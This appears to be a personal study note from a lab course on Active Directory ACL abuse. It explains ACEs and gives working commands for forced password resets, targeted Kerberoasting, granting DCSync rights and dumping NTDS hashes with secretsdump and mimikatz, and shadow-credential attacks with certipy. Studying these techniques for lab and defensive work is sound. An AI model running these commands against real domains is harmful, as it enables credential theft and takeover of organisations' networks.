---
tags: [ad, windows, acl]
aliases: [ACL Abuse]
---
# ACL Abuse

Not all users and computers in an AD can access all objects and files. These type of permissions are controlled through Access Control Lists (ACLs).

ACLs define who has access to a which asset/resource and the level of access they are provisioned. The setting themselves are called Access Control Entries (ACEs).

There are two types of ACLs
- Discretionary Access Control List defines which security principals are granted or denied access to an object. DACLs are made up of ACEs that either allow deny access. If DACL does not exist for an object, all who attempt to access the object are granted full rights. 
- System Access Control List (SACL) allow administrators to log access attempts made to secure objects. 

## Access Control Entries (ACEs)

There are three main types

| **ACE**              | **Description**                                                                                                                                                            |
| -------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Access denied ACE`  | Used within a DACL to show that a user or group is explicitly denied access to an object                                                                                   |
| `Access allowed ACE` | Used within a DACL to show that a user or group is explicitly granted access to an object                                                                                  |
| `System audit ACE`   | Used within a SACL to generate audit logs when a user or group attempts to access an object. It records whether access was granted or not and what type of access occurred |
Each ACE is made up of four components:
- The SID of the user group that has access to the object.
- A flag denoting the type of ACE
- A set of flags that specify whether or not child contains/objects can inherit the given ACE
- An access mask which is 32-bit value that define the rights granted to an object..

Attackers use ACEs to either further access or establish persistence. Many orgs are unaware of the ACEs applied to each object and these cannot be detected by vulnerability scanning tools. 

Some powerful ACEs to highlight the power of ACL attacks
- [ForceChangePassword](https://bloodhound.specterops.io/resources/edges/force-change-password#forcechangepassword) - gives us the right to reset a user's password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords).
- [GenericWrite](https://bloodhound.specterops.io/resources/edges/generic-write#genericwrite) - gives us the right to write to any non-protected attribute on an object. If we have this access over a user, we could assign them an SPN and perform a [[kerberoasting|Kerberoasting]] attack (which relies on the target account having a weak password set). Over a group means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack which is outside the scope of this module.
- [AddSelf](https://bloodhound.specterops.io/resources/edges/add-self#addself) - shows security groups that a user can add themselves to.
- [GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all#genericall) - this grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if we can obtain privileged controls or gain some sort of privileged access.

# Enumeration

We can use PowerView to enumerate ACLs, but there is a lot of information to parse through.

```powershell
Find-InterestingDomainAcl

# targeted search of a user
## first map the user's SID
## we should use the resolve GUIDs flag to return the human readable rights
$sid = Convert-NameToSid wley
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

We could also have done the same with LOTL binaries.

```powershell
# list of domain users
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt

# loop through and get access rights
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
```

### BloodHound

To enumerate ACLs we must set our start node of our user then `Node Info --> Outbound Control Rights` to view the ACLs

## Abusing

Once we have successfully discovered that we have some dangerous ACLs we can exploit, depending on the Right we can

```powershell
# create a credential object
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

# create a secure string which represents the password we want to set
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

# changing th user's password
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

### ForceChangePassword

The `ForceChangePassword` right lets us reset a user's password without knowing their current one. Beyond PowerView's `Set-DomainUserPassword`, native LOTL tools are often already on a Linux attack host.

```shell
# reset via Samba's net rpc (from Linux)
net rpc password <target_user> '<new_password>' -U '<DOMAIN>/<caller>%<caller_password>' -S <DC>

# reset via rpcclient (interactive)
rpcclient -U '<caller>' <DC>
rpcclient $> setuserinfo2 <target_user> 23 '<new_password>'
```

> The `23` value for `setuserinfo2` corresponds to the password-replace info level (SAMPR_USER_INFORMATION class `Password`).

It may also be interesting to create an SPN for a user we would like to attack if we have the `GenericAll` rights.

```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

# kerberoasting the created SPN
.\Rubeus.exe kerberoast /user:adunn /nowrap
```

> Alternatively, `GenericWrite` over the user is enough — write an SPN to the `servicePrincipalName` attribute and perform a targeted kerberoasting attack the same way. See the abuse section under the [WriteSPN](https://bloodhound.specterops.io/resources/edges/write-spn) edge for more information.

## DCSync

A technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, used by DCs to replicate data. An attacker mimics a DC to retrieve user NTLM password hashes.

In order to use this attack we must have the `DS-Replication-Get-Changes-All` extended right. 

### Prerequisites

The attack requires two extended rights on the **domain head object** (e.g., `DC=administrator,DC=htb`), not on a user:

| Extended Right | GUID |
|---|---|
| `DS-Replication-Get-Changes` | `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` |
| `DS-Replication-Get-Changes-All` | `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` |

By default these rights are held by: **Domain Admins**, **Enterprise Admins**, **BUILTIN\Administrators**, and **each Domain Controller's machine account**. Any principal we compromise that holds these rights can DCSync.

```powershell
# get the user's SID
Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcon
trol |fl

# check ACLs set on the domain object of our user's SID
$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

> If we have `WriteDACL` (or `GenericAll` / `WriteOwner`) on the **domain head object**, we can grant these rights to a user under our control:

```powershell
# grant DCSync rights to a user we control (-Rights DCSync adds both ACEs)
Add-DomainObjectAcl -TargetIdentity 'DC=administrator,DC=htb' -PrincipalIdentity <our_user> -Rights DCSync -Credential $Cred -Verbose
```

```shell
# extract NTLM hashes and Kerberos keys
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
```

The output will ave NTLM hashes, Kerberos keys and cleartext passwords from the NTDS for any accounts set with reversible encryption. When this option it does not mean that the passwords are stored in cleartext. Instead, they are stored using RC4 encryption. The key needed to decrypt them is stored in the registry and can be extracted by a Domain Admin or equivalent. 

```powershell
# check for users with reversible encryption
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

# equivalent
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

```cmd
# leverage the cleartext passsword
runas /netonly /user:INLANEFREIGHT\adunn powershell
```

We could also do the attack with mimikatz
```shell
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

# Shadow Credentials

| Component                              | What It Is                                                                                            |
| -------------------------------------- | ----------------------------------------------------------------------------------------------------- |
| `msDS-KeyCredentialLink`               | An AD attribute that stores **public keys** for PKINIT authentication                                 |
| PKINIT                                 | Kerberos extension that allows authentication using **public/private key pairs** instead of passwords |
| Windows Hello for Business (Key Trust) | Uses the `msDS-KeyCredentialLink` attribute to bind a device's public key to a user/computer account  |

Under normal operation:
- A user's device generates a key pair
- The **public key** is written to the account's `msDS-KeyCredentialLink` attribute in AD
- The **private key** stays on the device
- During PKINIT, the client proves ownership of the private key, and the DC verifies it against the stored public key

The attack **flips this model**: if you have write access to `msDS-KeyCredentialLink`, you can **inject your own public key** and authenticate as that account using the matching private key.

Given the proper ACEs (AddKeyCredentialLink, GenericWrite, GenericAll, WriteDACL, WriteOwner) we can write to the `msDS-KeyCredentialLink` attribute of a computer or user object . The domain must be using be PKINIT to attack the Windows Hello for Business Key Trust component. A public key stored on its AD object in the `msDS-KeyCredentialLink` attribute. The matching private key stays on the client device. During Kerberos PKINIT, the client proves it owns the private key, and the Domain Controller checks the matching public key from `msDS-KeyCredentialLink`.

The attack creates a fake device credential and then write that public key onto the target account and can request TGT using PKINIT.

```shell
# write the public key and attempt PKINIT to see if the domain supports
certipy-ad shadow add -u "$ATTACKER@$DOMAIN" -p "$ATTACKER_PASS" -dc-ip "$DC_IP" -account "$TARGET"
## can also use -ldap-scheme ldap

# will the DC accept a PKINIT AS-REQ and issue a TGT
certipy-ad auth -pfx user.pfx -dc-ip <DC_IP> -domain <domain.local>

# shadow credentials auto
certipy-ad shadow auto -u "$ATTACKER@$DOMAIN" -p "$ATTACKER_PASS" -dc-ip "$DC_IP" -account "$TARGET"
```

## Related

- [[access-tokens]]
- [[credential-enumeration]]
- [[api|API Shells]]
- [[07-active-directory/living-off-the-land|Living Off the Land]]

